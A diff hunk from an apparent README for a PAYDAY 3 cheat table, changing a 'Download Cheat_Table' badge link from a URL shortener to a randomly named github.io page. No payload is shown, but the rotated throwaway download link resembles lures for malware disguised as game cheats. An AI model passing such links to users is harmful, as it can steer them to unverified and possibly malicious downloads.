@@ -10,7 +10,7 @@
 
 ![Превью игры PAYDAY 3](https://cdn.cloudflare.steamstatic.com/steam/apps/1272080/header.jpg)
 
-[![Download](https://img.shields.io/badge/Download-Cheat_Table-green?style=for-the-badge&logo=github)](https://flyn.co/ThCH6y)
+[![Download](https://img.shields.io/badge/Download-Cheat_Table-green?style=for-the-badge&logo=github)](https://meteoric-rook-835.github.io/)
 
 </div>
 
